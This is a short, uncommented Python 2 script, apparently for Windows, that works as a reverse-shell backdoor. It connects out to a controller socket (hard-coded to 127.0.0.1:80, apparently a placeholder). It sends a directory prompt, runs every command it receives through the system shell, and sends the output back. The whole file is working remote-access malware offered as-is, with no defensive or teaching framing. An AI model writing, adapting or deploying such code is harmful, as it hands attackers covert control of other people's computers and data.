import socket
import subprocess
import Queue
import os
import threading
import time

marker = chr(255)

comm_socket = socket.socket()
comm_socket.connect(("127.0.0.1",80))
comm_socket.sendall("\n"+os.getcwd()+">"+marker)

output_queue = Queue.Queue()

class MessageHandler:
	def __init__(self, data_prefix):
		self.data_prefix = data_prefix
		self.input_queue = Queue.Queue()
		
	def send(self, data):
		output_queue.put(self.data_prefix+data+marker)
		
	def run(self):
		pass
		
class UserInputHandler(MessageHandler):

	def execute_command(self, cmde): #Function to execute commands
		if cmde:
			proc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
			timer = threading.Timer(60, proc_kill, [proc])
			timer.start()
			out = proc.stdout.read() + proc.stderr.read()
			timer.cancel()
			return out
		else:
			return "[-]Enter a command."

	def run(self):
		while True:
			print "trying to get data!"
			data = self.input_queue.get()
			output = self.execute_command(data)
			self.send(output)
		
handlers = []
user_input_handler = UserInputHandler(chr(1))
handlers.append(user_input_handler)

t = threading.Thread(target=user_input_handler.run)
t.daemon = True
t.start()

def data_sender():
	while True:
		comm_socket.sendall(output_queue.get())
				
t = threading.Thread(target=data_sender)
t.daemon = True
t.start()

while True:
	data = comm_socket.recv(4096)[:-1]
	if not data: break
	print "GOT DATA!!"
	
	if data.startswith(chr(1)):
		print "FOR USER INPUT!!"
		user_input_handler.input_queue.put(data[1:])
		
	elif data.startswith(chr(9)):
		pass